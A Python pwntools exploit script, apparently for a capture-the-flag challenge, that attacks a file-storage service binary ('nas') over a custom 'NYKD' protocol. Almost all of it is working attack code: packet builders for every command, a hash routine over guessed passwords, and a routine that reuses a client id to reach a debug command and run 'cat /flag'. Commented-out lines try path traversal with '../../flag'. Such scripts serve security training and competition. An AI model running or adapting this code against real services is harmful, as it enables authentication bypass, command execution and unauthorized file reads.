from pwn import * 



cmd_ping = 0  ## leak information 
cmd_register = 1 
cmd_rmusr = 2  #auth 2
cmd_reset_passwd = 3 #auth 2
cmd_upload_procedure = 4
cmd_download_procedure = 5 
cmd_list = 6
cmd_rename = 7
cmd_unlink = 8
cmd_debug = 9
cmd_read_cfg = 10 #auth 2
cmd_save_file = 11
cmd_restore_file = 12 
port = 8787 
payload = ''
flag = ''

passwd = []
for i in range(25):
    passwd.append(b'admin')
passwd[8] = b'5955456059341824784'
passwd[12] = b'pastapastagood'
passwd[16] = b'WOOOOOOheheWADSaaaDA'
passwd[20] = b'admin11111'
passwd[21] = b'not_admin'

count = 0

def decrypt(passwd):
    b = b'NYKD54'
    a = passwd
    c = 0x12348765 
    e = 0
    for i in range(len(a)):
        d = b[i%len(b)] ^ a[i]
        e = d ^ e
        e = e * c & 0xffffffff
    return e 

def ping():
    global passwd
    r.send(b'NYKD' + p32(passwd) + p32(cmd_ping))

def register(username, password):  ## malloc from unsorted bin
    global passwd
    payload = b'NYKD' + p32(passwd) + p32(cmd_register)
    payload = b'NYKD' + p32(0x1234) + p32(cmd_register)
    payload += username.ljust(0x20,b'\x00')
    payload += password.ljust(0x20,b'\x00')
    r.send(payload)

def rmusr(username):
    global passwd
    payload = b'NYKD' + p32(passwd) + p32(cmd_rmusr)    
    payload += username.ljust(0x20,b'\x00')
    r.send(payload)

def reset_passwd(client_id,password):
    global passwd
    payload = b'NYKD' + p32(passwd) + p32(cmd_reset_passwd)   
    payload += client_id
    payload += password
    r.send(payload)



def upload(filename,len,file_content=b''):
    global passwd
    payload = b'NYKD' + p32(passwd) + p32(cmd_upload_procedure)
    payload += filename.ljust(0x20,b'\x00')
    payload += p32(len)
    payload += file_content
    #print(payload)
    r.send(payload)

def download(filename, len):
    global passwd
    payload = b'NYKD' + p32(passwd) + p32(cmd_download_procedure)
    payload += filename.ljust(0x20,b'\x00')
    payload += p32(len) 
    r.send(payload)

def op_list(idx,len):
    global passwd
    payload = b'NYKD' + p32(passwd) + p32(cmd_list)
    payload += p32(idx) 
    payload += p32(len) 
    r.send(payload) 

def rename(filename,new_filename):
    global passwd
    payload = b'NYKD' + p32(passwd) + p32(cmd_rename)
    payload += filename.ljust(0x20,b'\x00')
    payload += new_filename.ljust(0x20,b'\x00')
    r.send(payload)

def unlink(filename):
    global passwd
    payload = b'NYKD' + p32(passwd) + p32(cmd_unlink)   
    payload += filename.ljust(0x20,b'\x00')
    r.send(payload)

def debug():
    global passwd
    payload = b'NYKD' + p32(passwd) + p32(cmd_debug) 
    r.send(payload)

def read_cfg(key):
    global passwd
    payload = b'NYKD' + p32(passwd) + p32(cmd_read_cfg)
    payload += key.ljust(0x80,b'\x00')   
    r.send(payload)

def save_file(filename,len,offset):
    global passwd
    payload = b'NYKD' + p32(passwd) + p32(cmd_save_file)   
    payload += filename.ljust(0x20,b'\x00')
    payload += p32(len)
    payload += p32(offset)
    r.send(payload)

def restore_file(filename,len):
    global passwd
    payload = b'NYKD' + p32(passwd) + p32(cmd_restore_file)   
    payload += filename.ljust(0x20,b'\x00')
    payload += p32(len)
    r.send(payload)

def pwn1(ip):
    global flag, count
    #r = remote(ip,port)
    
    register(b'admin123',b'admin456')
    client_id = u32(r.recv(4))
    r.send(b'NYKD' + p32(client_id) + p32(cmd_debug))
    r.sendafter(b'> ',b'echo ; cat /flag\n')
    r.recvline(1)
    #r.flushall()
    flag1 = r.recvuntil(b'>', drop = True).decode()
    #payload += flag1.decode() + ','
    flag += flag1 + ','
    count += 1
    print(flag1)
    r.close()

#r = process('./nas')
#r = remote('127.0.0.1',8787)
#r = process(['strace','./nas'])

passwd = decrypt(b'admin')
r = process('./nas')
pwn1(123)


r.interactive()






#target_file = b'../bbbbbb'
#upload(target_file,0)
#upload(b'../../flag',0x26,b'1')
# save_file(b'../../flag',0x70,0)
# restore_file(target_file,0)
# download(target_file,0x50)